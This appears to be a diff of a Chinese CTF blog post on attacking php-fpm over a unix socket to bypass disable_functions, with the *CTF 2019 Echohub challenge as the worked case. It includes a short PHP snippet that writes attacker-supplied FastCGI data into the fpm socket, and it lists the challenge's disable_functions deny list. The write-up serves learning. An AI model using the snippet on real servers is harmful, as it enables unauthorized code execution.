-&lt;p>现在是凌晨1点50分，赵总的题没能成功打出来真的很难受，很难受，很难受，我人裂开，说好的今天必定搞完，但是现在还差3个小标题和2个题没有复现&lt;/p>
-&lt;p>先把半成品放上来吧，这周内必定收尾！&lt;/p>
+&lt;p>yysy，确实没时间复现（复现赵总的题让我有心理阴影了）&lt;/p>
+&lt;p>我就先云一下，对8起&lt;/p>
+&lt;p>参考：&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
+&lt;h3 id="攻击unix-socket模式下的php-fpm">攻击unix socket模式下的php-fpm&lt;/h3>
+&lt;p>由于unix socket是读取/run/php/php7.4-fpm.sock进行内部通信，那必然是不能打远程，用的是&lt;code>stream_socket_client&lt;/code>建立一个unix socket连接，然后写入tcp流来通信&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
+&lt;p>前面的pwn部分我是不太能看懂（至少目前），就简单说说后面的web部分；&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">这里是参考wp&lt;/a>&lt;/p>
+&lt;p>从phpinfo可以看到disable_functions&lt;/p>
+&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
+&lt;/code>&lt;/pre>&lt;p>考虑用&lt;code>create_function&lt;/code>来rce，不过还是绕不过disable_functions来执行/readflag&lt;/p>
+&lt;p>不过跑一下给出的docker，可以看到用unix socket模式运行的php-fpm&lt;/p>
+&lt;p>题目环境安装了apache服务器和apache-module模式的php模块（这个就是题目环境），但是fpm也安装了并且启动&lt;/p>
+&lt;p>fpm模式的php.ini与phpinfo中显示的不同，是独立的，disable_funtcions的限制宽松很多，我们来打它来rce，exp就是上面那个&lt;/p>
 &lt;hr>
+&lt;p>拖拖拉拉四五天，总算是抽空给总结完了，对做题和学习方面又有了一些船新的理解，还是有很多收获的&lt;/p>
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
 以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
 &lt;/h4>
 &lt;/summary>
-&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm 与 Nginx优化总结&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm 与 Nginx优化总结&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP 连接方式 &amp;amp; PHP-FPM未授权访问漏洞 &amp;amp; *CTF echohub&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;amp;&amp;amp; PHP-FPM未授权访问漏洞 &amp;amp;&amp;amp; Exp编写&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions&lt;/a>&lt;/p>
+&lt;/details>
+&lt;hr>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+一点对近况的碎碎念
+&lt;/h4>
+&lt;/summary>
+&lt;p>最近有点自闭，看着那么多和我学习时间差不多的师傅都已经相当相当厉害了，我还是跟刚开始一样菜，满打满算学了也半年多了，怎么就这么菜呢？？？？？？？差距太大了，他妈的就是菜啊&lt;/p>
+&lt;p>看看别人博客都写得啥，cve复现，漏洞挖掘，渗透实战，安全研究，我呢？全是互联网湿垃圾，没一点含金量，就会写一点wp，还大多都是参考了别人的内容，然后写一点知识总结，跟个小学生一样&lt;/p>
+&lt;p>这周下了决心把没用的课的假请掉了，希望自己能好好利用起来，别摆了，真别摆了，要出大问题&lt;/p>
+&lt;p>不过总结是很有必要的，现在的进度是这样：&lt;/p>
+&lt;ul>
+&lt;li>php反序列化：缺 原生类的学习+跟一些实际的链子&lt;/li>
+&lt;li>python反序列化：完&lt;/li>
+&lt;li>sqli：差不多完，还得多做点题加深理解&lt;/li>
+&lt;li>SSTI：完&lt;/li>
+&lt;li>文件上传：之前9月总结到一半去打hvv了&lt;/li>
+&lt;li>php-fpm：完&lt;/li>
+&lt;li>GraphQL：完&lt;/li>
+&lt;/ul>
+&lt;p>很薄弱的地方都还没掌握（这不是废话），几个急需总结掌握的：&lt;/p>
+&lt;ul>
+&lt;li>ssrf：不熟练&lt;/li>
+&lt;li>xss：做题遇到都是躲着走&lt;/li>
+&lt;li>js圆形污染：跟上面那个总是一起出现&lt;/li>
+&lt;li>xxe&lt;/li>
+&lt;li>xsleaks&lt;/li>
+&lt;/ul>
+&lt;p>还有java，这个必须得学&lt;/p>
+&lt;p>不多说了，冲！！！&lt;/p>
 &lt;/details></description></item></channel></rss>
